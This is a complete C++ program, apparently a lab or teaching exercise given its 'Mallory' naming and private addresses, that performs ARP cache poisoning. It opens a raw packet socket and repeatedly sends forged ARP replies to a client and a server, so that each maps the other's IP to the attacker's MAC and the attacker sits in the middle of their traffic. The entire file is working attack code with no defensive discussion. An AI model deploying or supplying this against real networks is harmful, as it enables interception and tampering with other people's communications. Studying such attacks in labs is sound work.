#include <iostream>
#include <cstring>
#include <unistd.h>

#include <sys/socket.h>
#include <net/if.h>
#include <arpa/inet.h>

#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>

struct arp_header {
    uint16_t hardware_type;
    uint16_t protocol_type;
    uint8_t hardware_size;
    uint8_t protocol_size;
    uint16_t operation;

    unsigned char sender_mac[6];
    unsigned char sender_ip[4];

    unsigned char target_mac[6];
    unsigned char target_ip[4];
};

struct arp_packet {
    unsigned char destination_mac[6];
    unsigned char source_mac[6];

    uint16_t ether_type;

    arp_header arp;
};

void send_arp_reply(
    int socket_fd,
    int interface_index,
    unsigned char* mallory_mac,
    unsigned char* target_mac,
    unsigned char* claimed_ip,
    unsigned char* target_ip)
{
    arp_packet packet{};

    // Ethernet header
    memcpy(packet.destination_mac, target_mac, 6);
    memcpy(packet.source_mac, mallory_mac, 6);

    packet.ether_type = htons(ETH_P_ARP);

    // ARP header
    packet.arp.hardware_type = htons(ARPHRD_ETHER);
    packet.arp.protocol_type = htons(ETH_P_IP);

    packet.arp.hardware_size = 6;
    packet.arp.protocol_size = 4;

    packet.arp.operation = htons(ARPOP_REPLY);

    memcpy(packet.arp.sender_mac, mallory_mac, 6);
    memcpy(packet.arp.sender_ip, claimed_ip, 4);

    memcpy(packet.arp.target_mac, target_mac, 6);
    memcpy(packet.arp.target_ip, target_ip, 4);

    sockaddr_ll destination{};

    destination.sll_family = AF_PACKET;
    destination.sll_ifindex = interface_index;
    destination.sll_halen = 6;

    memcpy(destination.sll_addr,
           target_mac,
           6);

    sendto(socket_fd,
           &packet,
           sizeof(packet),
           0,
           (sockaddr*)&destination,
           sizeof(destination));
}

int main()
{
    const char* interface = "enp0s1";

    const unsigned char mallory_mac[6] = {
        0x3a, 0x42, 0x7d, 0x28, 0x80, 0xf1
    };

    const unsigned char client_mac[6] = {
        0x86, 0x37, 0x45, 0x68, 0xcb, 0x59
    };

    const unsigned char server_mac[6] = {
        0x76, 0x55, 0x92, 0x10, 0x42, 0x74
    };

    const unsigned char client_ip[4] = {
        192, 168, 64, 4
    };

    const unsigned char server_ip[4] = {
        192, 168, 64, 3
    };

    int socket_fd =
        socket(AF_PACKET,
               SOCK_RAW,
               htons(ETH_P_ARP));

    if (socket_fd == -1) {
        perror("socket");
        return 1;
    }

    int interface_index =
        if_nametoindex(interface);

    if (interface_index == 0) {
        perror("if_nametoindex");
        close(socket_fd);
        return 1;
    }

    std::cout << "ARP spoofing started..." << std::endl;

    while (true) {

        // Tell client:
        // Server IP belongs to Mallory MAC
        send_arp_reply(
            socket_fd,
            interface_index,
            const_cast<unsigned char*>(mallory_mac),
            const_cast<unsigned char*>(client_mac),
            const_cast<unsigned char*>(server_ip),
            const_cast<unsigned char*>(client_ip));

        // Tell server:
        // Client IP belongs to Mallory MAC
        send_arp_reply(
            socket_fd,
            interface_index,
            const_cast<unsigned char*>(mallory_mac),
            const_cast<unsigned char*>(server_mac),
            const_cast<unsigned char*>(client_ip),
            const_cast<unsigned char*>(server_ip));

        sleep(2);
    }

    close(socket_fd);

    return 0;
}
